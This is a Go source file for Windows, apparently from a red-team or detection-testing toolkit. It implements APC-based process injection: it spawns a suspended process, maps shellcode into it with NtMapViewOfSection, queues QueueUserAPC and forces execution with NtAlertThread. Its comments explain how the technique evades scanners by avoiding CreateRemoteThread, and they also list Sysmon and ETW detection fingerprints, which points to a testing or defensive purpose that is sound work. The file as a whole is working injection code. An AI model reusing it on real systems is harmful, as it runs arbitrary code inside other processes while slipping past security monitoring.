//go:build windows

package technique

import (
	"fmt"

	"golang.org/x/sys/windows"
)

// APCInject uses NtMapViewOfSection + QueueUserAPC.
//
// Evasion over section technique:
//   - No CreateRemoteThread → no Sysmon Event 8
//   - APC drains when thread enters alertable state (transparent to most scanners)
//
// Detection fingerprint:
//   - Sysmon Event 10: OpenProcess from injector
//   - Sysmon Event 25: ProcessTampering (remote executable mapping)
//   - ETW KERNEL_THREATINT_KEYWORD_MAPVIEW
func APCInject(target string, shellcode []byte) error {
	fmt.Printf("  [technique] NtMapViewOfSection + QueueUserAPC\n")
	fmt.Printf("  [target]    %s  payload %d bytes\n", target, len(shellcode))

	pi, err := spawnProcess(target, true)
	if err != nil {
		return err
	}
	fmt.Printf("  [spawned]   PID %d TID %d (suspended)\n", pi.ProcessId, pi.ThreadId)

	defer func() {
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)
	}()

	localAddr, remoteAddr, section, err := writeSection(pi.Process, shellcode)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return err
	}
	defer procNtClose.Call(uintptr(section))
	procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), localAddr)
	fmt.Printf("  [remote map] 0x%x (RX, PID %d)\n", remoteAddr, pi.ProcessId)

	// Queue APC on the suspended main thread.
	// APC fires when the thread enters an alertable wait state.
	r1, _, err := procQueueUserAPC.Call(remoteAddr, uintptr(pi.Thread), 0)
	if r1 == 0 {
		procNtUnmapViewOfSection.Call(uintptr(pi.Process), remoteAddr)
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("QueueUserAPC: %w", err)
	}
	fmt.Printf("  [apc]       queued on TID %d\n", pi.ThreadId)

	// NtAlertThread forces the thread into an alerted state, draining the APC queue
	// on the next scheduler quantum without waiting for a natural alertable API call.
	procNtAlertThread.Call(uintptr(pi.Thread))

	if _, err := windows.ResumeThread(pi.Thread); err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("ResumeThread: %w", err)
	}
	fmt.Printf("  [resumed]   PID %d — APC will fire on first alertable wait\n", pi.ProcessId)
	return nil
}
